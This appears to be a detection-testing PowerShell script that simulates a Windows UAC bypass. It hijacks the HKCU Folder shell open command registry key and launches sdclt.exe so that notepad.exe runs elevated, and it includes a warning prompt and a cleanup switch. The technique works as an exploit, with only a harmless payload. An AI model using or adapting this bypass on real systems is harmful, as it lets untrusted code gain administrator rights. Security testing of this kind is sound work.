param(
    [switch]$CleanUp,
    [switch]$Force
)

# Display warning prompt unless Force is specified or in CleanUp mode
if (-not $Force -and -not $CleanUp) {
    Write-Host "`n================================================" -ForegroundColor Yellow
    Write-Host "                ***  WARNING  *** " -ForegroundColor Red
    Write-Host "       UAC Bypass Simulation Script" -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Yellow
    Write-Host "`nThis script will attempt to bypass User Account Control:" -ForegroundColor White
    Write-Host "  - Modify HKCU registry to hijack folder handler" -ForegroundColor Cyan
    Write-Host "  - Launch sdclt.exe to trigger the bypass" -ForegroundColor Cyan
    Write-Host "  - Execute notepad.exe with elevated privileges" -ForegroundColor Cyan
    Write-Host "`nRegistry path: HKCU:\Software\Classes\Folder\shell\open\command" -ForegroundColor White
    Write-Host "`nThis is for TESTING/SIMULATION purposes only." -ForegroundColor Red
    Write-Host "This activity will trigger security alerts." -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Yellow
    
    $response = Read-Host "Do you want to continue? (Y/N)"
    if ($response -notmatch '^[Yy]') {
        Write-Host "Script execution cancelled by user." -ForegroundColor Yellow
        return
    }
    Write-Host ""
}

if($CleanUp){
    Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
}
else {
    New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
    New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
    Start-Process -FilePath "$env:windir\system32\sdclt.exe"
}